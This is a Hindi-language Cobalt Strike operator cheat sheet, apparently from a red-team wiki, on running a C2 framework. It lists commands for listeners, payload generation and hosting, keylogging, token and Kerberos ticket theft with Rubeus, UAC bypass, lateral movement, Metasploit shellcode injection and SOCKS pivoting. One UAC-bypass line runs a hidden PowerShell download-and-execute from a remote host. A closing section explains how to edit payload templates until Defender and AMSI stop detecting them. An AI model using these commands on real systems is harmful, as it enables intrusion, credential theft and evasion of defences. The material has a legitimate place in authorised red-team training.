# Cobalt Strike

### सुनवाईकर्ता

### सी2 सुनवाईकर्ता

`Cobalt Strike -> सुनवाईकर्ता -> जोड़ें/संपादित करें` फिर आप कहां सुनना चाहते हैं, किस प्रकार के बीकन का उपयोग करना चाहते हैं (http, dns, smb...) और अधिक का चयन कर सकते हैं।

### पीयर2पीयर सुनवाईकर्ता

इन सुनवाईकर्ताओं के बीकनों को सी2 के साथ सीधे बातचीत करने की आवश्यकता नहीं होती है, वे इसके माध्यम से इससे संवाद कर सकते हैं।

`Cobalt Strike -> सुनवाईकर्ता -> जोड़ें/संपादित करें` फिर आपको TCP या SMB बीकन का चयन करना होगा

* **TCP बीकन चयनित पोर्ट में एक सुनवाईकर्ता सेट करेगा**। एक TCP बीकन से कनेक्ट करने के लिए दूसरे बीकन से `connect <ip> <port>` कमांड का उपयोग करें
* **smb बीकन चयनित नाम के पाइपमें सुनेगा**। SMB बीकन से कनेक्ट करने के लिए आपको `link [target] [pipe]` कमांड का उपयोग करना होगा।

### पेलोड उत्पन्न करें और होस्ट करें

#### फ़ाइलों में पेलोड उत्पन्न करें

`हमले -> पैकेज ->`&#x20;

* **`HTMLApplication`** HTA फ़ाइलों के लिए
* **`MS Office Macro`** मैक्रो के साथ एक ऑफ़िस दस्तावेज़ के लिए
* **`Windows Executable`** .exe, .dll या सेवा .exe के लिए
* **`Windows Executable (S)`** एक **stageless** .exe, .dll या सेवा .exe के लिए (स्टेजलेस स्टेज्ड से बेहतर है, कम IoC)

#### पेलोड उत्पन्न करें और होस्ट करें

`हमले -> वेब ड्राइव-बाई -> स्क्रिप्टेड वेब वितरण (S)` इससे एक स्क्रिप्ट/एक्सीक्यूटेबल उत्पन्न होगा जो कोबाल्ट स्ट्राइक से बीकन को डाउनलोड करने के लिए होगा, जैसे: bitsadmin, exe, powershell और python

#### पेलोड होस्ट करें

यदि आपके पास पेश करने के लिए वेब सर्वर में रखने की फ़ाइल है, तो केवल `हमले -> वेब ड्राइव-बाई -> फ़ाइल होस्ट` पर जाएं और होस्ट करने के लिए फ़ाइल का चयन करें और वेब सर्वर कॉन्फ़िगरेशन करें।

### बीकन विकल्प

<pre class="language-bash"><code class="lang-bash"># स्थानीय .NET बाइनरी को निष्पादित करें
execute-assembly &#x3C;/path/to/executable.exe>

# स्क्रीनशॉट
printscreen    # प्रिंटस्क्रीन विधि के माध्यम से एकल स्क्रीनशॉट लें
screenshot     # एकल स्क्रीनशॉट लें
screenwatch    # डेस्कटॉप के नियमित अंतराल पर स्क्रीनशॉट लें
## उन्हें देखने के लिए व्यू -> स्क्रीनशॉट पर जाएं

# कीलॉगर
keylogger [pid] [x86|x64]
## कुंजीस्पर्श को देखने के लिए व्यू > कीस्ट्रोक्स पर जाएं

# पोर्टस्कैन
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # दूसरे प्रक्रिया में पोर्टस्कैन क्रिया इंजेक्ट करें
portscan [targets] [ports] [arp|icmp|none] [max connections]

# पावरशेल
# पावरशेल मॉड्यूल आयात करें
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;यहां पावरशेल कमांड लिखें>

# उपयोगकर्ता अनुकरण
## क्रेडेंशियल के साथ टोकन उत्पन्न करें
make_token [DOMAIN\user] [password] # नेटवर्क में एक उपयोगकर्ता के रूप में अनुकरण करने के लिए टोकन बनाएं
ls \\computer_name\c$ # एक कंप्यूटर में C$ तक पहुँचने के लिए उत्पन्न टोकन का उपयोग करने का प्रयास करें
rev2self # make_token के साथ उत्पन्न टोकन का उपयोग करना बंद करें
## make_token का उपयोग ईवेंट 4624 उत्पन्न करता है: एक खाता सफलतापूर्वक लॉग ऑन हुआ था। यह ईवेंट विंडोज डोमेन में बहुत सामान्य है, लेकिन लॉगऑन प्रकार पर फ़िल्टर करके इसे संक्षेप में किया जा सकता है। जैसा कि पहले कहा गया है, इसमें LOGON32_LOGON_NEW_CREDENTIALS का उपयोग होता है जो प्रकार 9 है।

# UAC बाईपास
elevate svc-exe &#x3C;सुनवाईकर्ता>
elevate uac-token-duplication &#x3C;सुनवाईकर्ता>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## प्रक्रिया से टोकन चुरा लें
## make_token की तरह, लेकिन प्रक्रिया से
## SYSTEM से टिकट पास करें
## टिकट के साथ एक नया प्रक्रिया उत्पन्न करें
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## उस प्रक्रिया से टोकन चुराएं
steal_token &#x3C;pid>

## टिकट + टिकट पास निकालें
### टिकट सूची बनाएं
execute-assembly C:\path\Rubeus.exe triage
### luid द्वारा दिलचस्प टिकट डंप करें
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### नई लॉगऑन सत्र बनाएं, luid और processid का ध्यान रखें
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### उत्पन्न लॉगऑन सत्र में टिकट डालें
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### अंत में, उस नई प्रक्रिया से टोकन चुराएं
steal_token &#x3C;pid>

# लैटरल मूवमेंट
## यदि टोकन बनाया गया है तो उसका उपयोग किया जाएगा
jump [method] [target] [listener]
## विधियाँ:
## psexec                    x86   सेवा का उपयोग करके एक सेवा EXE आर्टिफैक्ट चलाने के लिए
## psexec64                  x64   सेवा का उपयोग करके एक सेवा EXE आर्टिफैक्ट चलाने के लिए
## psexec_psh                x86   सेवा का उपयोग करके एक PowerShell वन-लाइनर चलाने के लिए
## winrm                     x86   WinRM के माध्यम से एक PowerShell स्क्रिप्ट चलाएं
## winrm64                   x64   WinRM के माध्यम से एक PowerShell स्क्रिप्ट चलाएं

remote-exec [method] [target] [command]
## विधियाँ:
<strong>## psexec                          सेवा नियंत्रण प्रबंधक के माध्यम से रिमोट एक्जीक्यूट करें
</strong>## winrm                           WinRM के माध्यम से रिमोट एक्जीक्यूट करें (PowerShell)
## wmi                             WMI के माध्यम से रिमोट एक्जीक्यूट करें

## WMI के साथ एक बीकन निष्पादित करने के लिए (यह जंप कमांड में नहीं है) बस बीकन अपलोड करें और इसे निष्पादित करें
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Metasploit को सत्र पास करें - लिस्टनर के माध्यम से
## Metaploit होस्ट पर
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobalt पर: Listeners > Add और Payload को Foreign HTTP पर सेट करें। Host को 10.10.5.120, Port को 8080 सेट करें और Save पर क्लिक करें।
beacon> spawn metasploit
## आप केवल विदेशी लिस्टनर के साथ x86 Meterpreter सत्र उत्पन्न कर सकते हैं।

# Metasploit सत्र को cobalt strike को पास करें - शेलकोड इंजेक्शन के माध्यम से
## Metasploit होस्ट पर
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenom चलाएं और multi/handler लिस्टनर को तैयार करें

## बिन फ़ाइल को cobalt strike होस्ट में कॉपी करें
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Metasploit सत्र को cobalt strike को पास करें
## निर्मित Beacon शेलकोड उत्पन्न करें, Attacks > Packages > Windows Executable (S) पर जाएं, वांछित लिस्टनर का चयन करें, आउटपुट प्रकार के रूप में Raw का चयन करें और Use x64 payload का चयन करें।
## Metasploit में post/windows/manage/shellcode_inject का उपयोग करें जिससे उत्पन्न किया गया cobalt srike shellcode इंजेक्ट होता है


# पिवटिंग
## टीमसर्वर में एक सॉक्स प्रॉक्सी खोलें
beacon> socks 1080

# SSH कनेक्शन
beacon> ssh 10.10.17.12:22 username password</code></pre>

## AVs से बचें

### Artifact Kit

आमतौर पर `/opt/cobaltstrike/artifact-kit` में आपको कोबाल्ट स्ट्राइक द्वारा उत्पन्न बाइनरी बीकन के कोड और पूर्व-संकलित टेम्पलेट (`/src-common` में) मिलेंगे।

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग उत्पन्न बैकडोर (या केवल कंपाइल किए गए टेम्पलेट) के साथ करके आप यह जांच सकते हैं कि डिफेंडर को क्या ट्रिगर कर रहा है। आमतौर पर यह एक स्ट्रिंग होती है। इसलिए आप बैकडोर उत्पन्न कर रहे कोड में उस स्ट्रिंग को नहीं दिखने देने के लिए संशोधित कर सकते हैं।

कोड को संशोधित करने के बाद उसी निर्देशिका से `./build.sh` चलाएं और `dist-pipe/` फ़ोल्डर को Windows क्लाइंट में `C:\Tools\cobaltstrike\ArtifactKit` में कॉपी करें।
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
यह न भूलें कि आपको विनाशकारी स्क्रिप्ट `dist-pipe\artifact.cna` लोड करना होगा ताकि Cobalt Strike को हमारे द्वारा चयनित डिस्क संसाधनों का उपयोग करने के लिए नहीं करना पड़े।

### संसाधन किट

संसाधन किट फ़ोल्डर में Cobalt Strike के स्क्रिप्ट-आधारित पेलोड के टेम्पलेट होते हैं, जिनमें PowerShell, VBA और HTA शामिल हैं।

टेम्पलेट के साथ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके आप यह जान सकते हैं कि डिफ़ेंडर (इस मामले में AMSI) को क्या पसंद नहीं है और उसे संशोधित कर सकते हैं:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
डिटेक्ट की गई लाइनों को संशोधित करके एक टेम्पलेट बनाया जा सकता है जो पकड़ा नहीं जाएगा।

याद रखें कि आपको एग्रेसिव स्क्रिप्ट `ResourceKit\resources.cna` लोड करना नहीं भूलना चाहिए ताकि कोबाल्ट स्ट्राइक को बताया जा सके कि हमें डिस्क से रिसोर्सेज़ का उपयोग करना है और न कि लोड किए गए रिसोर्सेज़।
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

